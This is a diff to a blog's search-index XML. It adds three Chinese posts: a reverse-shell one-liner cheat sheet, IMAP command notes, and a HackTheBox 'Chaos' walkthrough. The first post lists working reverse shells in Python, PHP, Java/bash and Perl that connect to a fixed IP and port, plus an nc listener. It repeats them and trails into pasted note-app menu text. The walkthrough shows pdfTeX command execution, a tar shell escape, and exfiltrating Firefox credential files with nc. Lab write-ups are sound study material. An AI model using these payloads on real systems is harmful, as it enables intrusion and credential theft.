@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>shell一句话</title>
+      <link href="/2019/03/06/shell%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
+      <url>/2019/03/06/shell%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
+      
+        <content type="html"><![CDATA[<p>###python脚本反弹<br>    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><p>###php 脚本反弹<br>    php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p><p>###Java 脚本反弹<br>    r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()</p><p>###perl 脚本反弹<br>    perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><p>###NC 监听一句话<br>    nc -v -l -v -p 8080</p><p>#####NC 无法使用su命令解决办法：<br>    python -c ‘import pty; pty.spawn(“/bin/sh”)’</p><p>python脚本反弹</p><p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>php 脚本反弹</p><p>php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Java 脚本反弹</p><p>r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()<br>perl 脚本反弹</p><p>perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>NC 监听一句话</p><p>nc -v -l -v -p 8080<br>NC 无法使用su命令解决办法：</p><p>python -c ‘import pty; pty.spawn(“/bin/sh”)’<br>     786<br> 绑定印象笔记账号<br> 绑定 Evernote International 账号<br>当前文档<br> 恢复至上次同步状态<br> 删除文档<br> 导出…<br> 预览文档<br> 分享链接<br>系统<br> 设置<br> 使用说明<br> 快捷帮助<br> 常见问题<br> 关于</p><p>搜索文件<br>python脚本反弹 </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>imap邮件服务器常用命令</title>
+      <link href="/2019/03/06/imap%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+      <url>/2019/03/06/imap%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<p>###imap常用命令</p><p>####登陆: <code>A LOGIN USER PASS</code><br>        A是代号可以随便写 LOGIN是登录的意思，USER是用户名，PASS是密码。</p><p>####查询：A LIST  “” *</p><p>####选择 ：A SELECT  INBOX<br>        这里选择的是收件箱，如果是想选择草稿箱的话就把INBOX改成Drafts即可</p><p>####查看邮件：A fetch 1 body[text]<br>        1代表的是第一封邮件，text代表的是整个邮件整体，body[HEADER]代表的是返回完整的文件头信息。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> imap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HackTheBox Chaos</title>
+      <link href="/2019/03/06/HackTheBox-Chaos/"/>
+      <url>/2019/03/06/HackTheBox-Chaos/</url>
+      
+        <content type="html"><![CDATA[<p>###Chaos 靶机渗透</p><p>####靶机地址：<a href="https://www.hackthebox.eu/home/machines/profile/167" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/167</a></p><p>####目标IP: 10.10.10.120(Linux)</p><p>####本机IP: 10.10.14.97(Kali)</p><p>#####使用nmap对目标进行扫描 <code>nmap -sS 10.10.10.120</code><br><img src="https://p0.ssl.qhimg.com/t010487ac52686743fc.png" alt=""></p><p>######nmap返回的信息中告诉我们很多有用的信息:<br>        80：我们可以尝试在浏览器访问找出有用的信息<br>        110：运行有pop3邮件服务器<br>        143：运行imap邮件服务器<br>        993：imap邮件服务器的ssl通道<br>        995：pop3邮件服务器的ssl通道</p><p>#####我们访问WEB页面查看有什么可以利用的信息。</p><p>######发现web页面收禁止我们使用IP访问<br><img src="https://p0.ssl.qhimg.com/t0106e95f1a51e63771.png" alt=""></p><p>#####那我们使用drbp对目标进行一波目录扫描，看下有什么可用的信息。</p><p>######发现一个wordpress博客<br><img src="https://p1.ssl.qhimg.com/t01512e963acfa9e1b2.png" alt=""></p><p>#####我们进去博客发现它说让我们输入密码才能查看这个文章，那我们不知道密码怎么，那就是试着用作者名字是否就是密码，那我们也不知道作者名字啊。怎么办？这时候就要利用一个WP的一个小漏洞了。<br><img src="https://p5.ssl.qhimg.com/t017f442e90389b2223.png" alt=""></p><p>#####在浏览器上输入<code>?author=1</code>就会发现下面出现了作者的名字。这时候我们就把名字输入Password里面去。<br><img src="https://p1.ssl.qhimg.com/t0108a033f776181ba7.png" alt=""><br>这时候我们就看到了suer和pass，但是这里写着说是webmail的，也就是说这是邮箱服务器的账号密码，不是后台的。</p><p>######那么这时候我们登录邮件服务器。<br>        连接imap openssl s_client -connect 10.10.10.120:993`<br>        这里需要注意使用telnet是无法连接的，只有用ssl才能连接。<br>        然后输入 a LOGIN ayush jiujitsu<br>        这里的a是代号，顺便输入也行， LOGIN 是固定的，ayush是账号,jiujitsu是密码。<br><img src="https://p5.ssl.qhimg.com/t014d7f10de22a6ad78.png" alt=""></p><p>######进去imap服务器之后我们看下有什么可利用的信息。</p><p>######输入<code>a list &quot;&quot; *</code> 发现有一个叫INbox的箱子很是可疑。那么我们就进这个箱子看下。<br><img src="https://p0.ssl.qhimg.com/t0108c611885e8d8e1c.png" alt=""></p><p>######进这个箱子发现什么都没有，比我的脸还要干净。<br><img src="https://p4.ssl.qhimg.com/t012e2c5e51d1edfa0c.png" alt=""></p><p>######找来找去我们发现什么都没有，怎么办？突然想起邮件的草稿我们还没看，那么我们进去看下</p><p>######输入<code>* select Drafts</code>后发现里面有一个封草稿邮件，发现有邮件那么我们就看下这邮件里面有什么可利用的信息。</p><p>#####我们发现里面有两个文件，一个enim_msg.txt,一个是en.py。<br><img src="https://p1.ssl.qhimg.com/t01e385b171ac1cddc4.png" alt=""></p><p>######我们把这两个文件都copy下载</p><p>#####邮件中有提到base64解密，那么我们就把这两个文件都交给base64解一下。<br><img src="https://p4.ssl.qhimg.com/t013be8b2e07ddfcbc1.png" alt=""><br><img src="https://p3.ssl.qhimg.com/t01b160e11000c2475c.png" alt=""></p><p>#####两个文件我们只解出一个en.py，另一个enimg_msg.txt解出了还是加密的。那我们先不理enimg_msg文件，我们来看下en.py。<br><img src="https://p0.ssl.qhimg.com/t010788b4e7f6a261a2.png" alt=""></p><p>#####看了一遍又一遍看不懂这是什么，那直接把全部的代码都丢到google上面，然后发现了有一个完整的python脚本。<br><img src="https://p4.ssl.qhimg.com/t01b242da8a2c9aa2ca.png" alt=""></p><p>#####使用脚本来解enimg_msg.txt就得到一个web地址<br><img src="https://p1.ssl.qhimg.com/t0171b112d4269bc125.png" alt=""></p><p>#####那么我们现在来看下这个http地址有什么可以利用的信息。<br><img src="https://p3.ssl.qhimg.com/t0183455f39392850d9.png" alt=""></p><p>######发现这是一个txt转pdf的插件，那么我们google一下看下pdfTeX这个插件，发现有一个远程执行代码漏洞，那么我们马上开干。</p><p>#####这次用的是python返回shell一句话和nc，python一句话需要注意的是必须要进行url编码不然是无法使用的<br><img src="https://p2.ssl.qhimg.com/t017621fa2a12cfe77f.png" alt=""></p><p>#####getshell之后我们看下自己的权限，发现是www权限，那么我们就要进行提权，这时候我们来试下webemail的账号是否能在这里登录。<br><img src="https://p0.ssl.qhimg.com/t018b5dd9bc8e9ff0a4.png" alt=""></p><p>######ayush账号可以在这里登陆，那么我们就开始提权。PS：要是nc 无法执行su命令那么就执行 <code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code>就可以使用su命令了。</p><p>#####尝试提权</p><p>######查看我们可以使用什么命令，发现我们可以tar，那么我们就输入<br><code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh</code><br><img src="https://p2.ssl.qhimg.com/t01ac200fda735e580f.png" alt=""></p><p>#####这时候我们就可以使用/bin/sh，然后我们去到该用户的主目录，在这里我们找到了user.txt。<br><img src="https://p4.ssl.qhimg.com/t01786ebf836c6c56ad.png" alt=""></p><p>#####提权各种套路都试下了，还是无法提权，这时候想到.Mozilla是否存放有有关root的密码，因为如果有管理员这台机子上网说不定有保存密码，然而密码说不定就和root密码相同。在目标机上找到.mozilla文件里面的logins.json和key4.db 把他们copy到kali上。</p><pre><code>在目标机上执行`/bin/nc -w 3 10.10.12.163 5556 &lt; logins.json`在kali上执行`nc -l -p 5556 &gt; logins.json`</code></pre><p>#####把logins.json和key4.db文件覆盖了本地文件之后在火狐上查看密码，然后发现里面真的有root密码。<br><img src="https://p0.ssl.qhimg.com/t01f25a43ff0f0a7542.png" alt=""></p><p>#####使用root密码登陆进去，找到root.txt。<br><img src="https://p4.ssl.qhimg.com/t01a69e5bd87784012a.png" alt=""></p><p>####后记：虽然这次的靶机的脑洞很大，但是可以在里面学到很多东西，imap的命令操作，使用tar提权等等。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> HackTheBox </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>wpscan更新后出现错误</title>
       <link href="/2019/03/03/wpscan%E6%9B%B4%E6%96%B0%E5%90%8E%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF/"/>
       <url>/2019/03/03/wpscan%E6%9B%B4%E6%96%B0%E5%90%8E%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF/</url>
